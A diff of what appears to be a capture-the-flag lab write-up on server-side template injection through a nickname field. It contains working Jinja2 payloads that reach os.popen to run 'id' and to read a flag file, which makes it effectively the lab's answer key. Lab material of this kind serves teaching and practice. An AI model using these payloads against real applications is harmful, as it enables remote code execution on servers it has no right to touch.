@@ -24,9 +24,11 @@ safe — this one is the exception.
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
    ```
    Response will contain real command output, e.g. `uid=0(root) gid=0(root)...`.
-3. From there, standard post-RCE steps apply (read env vars, pivot, etc.) —
-   out of scope for this specific module's write-up, but worth noting in a
-   report as full remote code execution, not "just" template injection.
+3. For scoring, read the actual flag file the same way and submit its
+   contents at `/flags/submit`:
+   ```
+   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /srv/flags/ssti_flag.txt').read() }}
+   ```
 
 ## Hints
 - Hint 1: "What happens if your nickname isn't actually a name?"
